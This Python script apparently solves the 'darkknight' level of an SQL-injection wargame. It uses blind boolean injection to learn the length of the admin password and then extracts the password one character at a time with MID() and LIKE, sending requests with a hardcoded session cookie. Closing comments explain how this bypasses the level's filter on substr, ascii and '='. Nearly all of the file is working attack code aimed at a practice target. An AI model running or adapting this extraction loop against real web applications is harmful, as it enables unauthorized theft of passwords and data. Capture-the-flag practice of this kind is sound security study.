#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import re
from termcolor import colored
from bs4 import BeautifulSoup as bs
import sys, getopt
import urllib.parse

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
parameter = 'no'
cookie = dict(PHPSESSID='e65uev8hnti7n47a7qe5auesel')

password_length = 0

for i in range(1,9):
    sql = "1 or length(pw) LIKE {}".format(i)
    # sql = urllib.parse.quote(sql)
    query_url = "%s?%s=%s" % (url,parameter,sql)
    print("[*]%s" % query_url)

    http_request=requests.get(query_url,cookies=cookie)
    res = bs(http_request.text,"html.parser")

    if "Hello admin" in res.text:
        print("password length: {}".format(i))
        password_length = i 

print(password_length)

common = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
passwd = ''

for i in range(1,password_length + 1):
    for j in common:

        sqli = ("-1 or MID(pw, 1, %d) LIKE \"%s\" -- ;" % (i,passwd + j))
        # sqli = urllib.parse.quote(sqli)

        query_url = "%s?%s=%s" % (url,parameter,sqli)
        print("[*]%s" % query_url)

        http_request=requests.get(query_url,cookies=cookie)
        res = bs(http_request.text,"html.parser")

        if "Hello admin" in res.text:
            passwd += j 
            print('password: %s' % passwd)
            break
            
        elif j in common[-1]:
            # the end of string that means the password is found
            print('password: %s' % passwd)
            exit(1)


# restricted letters are ',substr,ascii,= of 4 letters.
# select id from prob_darkknight where id='guest' and pw='' and no=1 or length(pw) LIKE 8
# pw is bracketed meaning it can't escape but no is not
# hence, no can have appended query to its end...